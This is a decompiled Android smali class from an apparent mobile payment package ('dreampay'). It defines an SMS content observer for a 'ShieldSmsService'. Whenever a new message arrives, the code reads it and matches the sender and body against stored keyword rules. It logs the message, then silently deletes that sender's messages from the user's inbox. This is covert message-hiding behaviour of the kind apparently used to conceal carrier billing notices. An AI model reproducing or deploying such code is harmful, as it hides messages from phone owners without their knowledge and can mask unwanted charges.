.class final Lcom/yuelan/dreampay/service/h;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic a:Lcom/yuelan/dreampay/service/ShieldSmsService;


# direct methods
.method public constructor <init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/yuelan/dreampay/service/h;->a:Lcom/yuelan/dreampay/service/ShieldSmsService;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 9

    const/4 v3, 0x0

    iget-object v0, p0, Lcom/yuelan/dreampay/service/h;->a:Lcom/yuelan/dreampay/service/ShieldSmsService;

    invoke-static {v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->c(Lcom/yuelan/dreampay/service/ShieldSmsService;)Landroid/content/Context;

    move-result-object v0

    const-string v1, "content://sms/"

    invoke-static {v0, v1}, Lcom/yuelan/codelib/sim/SmsContent;->getSmsInfo(Landroid/content/Context;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lez v1, :cond_0

    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/yuelan/codelib/sim/SmsInfo;

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/yuelan/dreampay/service/h;->a:Lcom/yuelan/dreampay/service/ShieldSmsService;

    const-string v2, "port"

    const-string v4, "keyone"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v2, v4, v5}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(Lcom/yuelan/dreampay/service/ShieldSmsService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v5

    if-eqz v5, :cond_0

    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lez v1, :cond_0

    move v2, v3

    :goto_0
    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lt v2, v1, :cond_1

    :cond_0
    :goto_1
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    return-void

    :cond_1
    invoke-virtual {v5, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_4

    const-string v4, "#"

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    move v1, v3

    move v4, v3

    :goto_2
    array-length v7, v6

    if-lt v1, v7, :cond_2

    array-length v1, v6

    if-ne v4, v1, :cond_4

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u5c4f\u853d\u6570\u636e\u5e93\u5220\u9664\u4e86"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getSmsid()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getSmsbody()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/yuelan/dreampay/service/h;->a:Lcom/yuelan/dreampay/service/ShieldSmsService;

    invoke-static {v1}, Lcom/yuelan/dreampay/service/ShieldSmsService;->c(Lcom/yuelan/dreampay/service/ShieldSmsService;)Landroid/content/Context;

    move-result-object v1

    const-string v2, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_2
    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getSmsbody()Ljava/lang/String;

    move-result-object v7

    aget-object v8, v6, v1

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_3

    add-int/lit8 v4, v4, 0x1

    :cond_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    :cond_4
    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_0
.end method
